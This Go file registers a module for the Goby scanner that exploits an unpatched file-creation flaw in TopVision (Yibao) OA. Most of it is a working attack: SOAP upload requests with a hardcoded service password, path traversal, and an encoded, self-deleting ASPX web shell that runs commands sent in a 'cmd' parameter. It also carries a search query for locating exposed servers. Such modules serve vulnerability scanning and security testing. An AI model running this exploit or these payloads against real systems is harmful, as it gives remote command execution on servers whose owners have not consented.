package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TopVision OA UploadPersonalFile File Creation",
    "Description": "<p>TopVision OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also everyone can record important matters here, and the software also has a better check-in The system allows users to quickly record their work hours, and it will be easier to adjust shifts and make up cards, so that your work activity will be improved. This product has a file creation vulnerability, which can be written to the Webshell to obtain server permissions.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2022-12-03",
    "Author": "1angx",
    "FofaQuery": "title=\"欢迎登录易宝OA系统\"|| banner=\"易宝OA\"",
    "GobyQuery": "title=\"欢迎登录易宝OA系统\"|| banner=\"易宝OA\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to write arbitrary files and gain server privileges by writing to the webshell.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.its365.net\">http://www.its365.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebService/BasicService.asmx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://tempuri.org/UploadPersonalFile"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UploadPersonalFile xmlns=\"http://tempuri.org/\">\n      <fs>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCUKUmVzcG9uc2UuV3JpdGUoRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKCJ0ZXN0MTIzIiwgIk1ENSIpKTsKU3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTsKJT4=</fs>\n      <FileName>../../manager/1.aspx</FileName>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n    </UploadPersonalFile>\n  </soap:Body>\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "UploadPersonalFileResponse",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/1.aspx",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "CC03E747A6AFBBCBF8BE7668ACFEBEE5",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/WebService/BasicService.asmx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": "http://tempuri.org/UploadPersonalFile"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UploadPersonalFile xmlns=\"http://tempuri.org/\">\n      <fs>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</fs>\n      <FileName>../../manager/1.aspx</FileName>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n    </UploadPersonalFile>\n  </soap:Body>\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/1.aspx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Creation"
    ],
    "VulType": [
        "File Creation"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "易宝OA  UploadPersonalFile 文件创建漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。该产品存在文件创建漏洞，可写入Webshell获取服务器权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.its365.net/products.aspx\">http://www.its365.net/products.aspx</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞写入任意文件，通过写入webshell获取服务器权限。<br></p>",
            "VulType": [
                "文件创建"
            ],
            "Tags": [
                "文件创建"
            ]
        },
        "EN": {
            "Name": "TopVision OA UploadPersonalFile File Creation",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>TopVision OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also everyone can record important matters here, and the software also has a better check-in The system allows users to quickly record their work hours, and it will be easier to adjust shifts and make up cards, so that your work activity will be improved. This product has a file creation vulnerability, which can be written to the Webshell to obtain server permissions.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.its365.net\">http://www.its365.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to write arbitrary files and gain server privileges by writing to the webshell.<br></p>",
            "VulType": [
                "File Creation"
            ],
            "Tags": [
                "File Creation"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
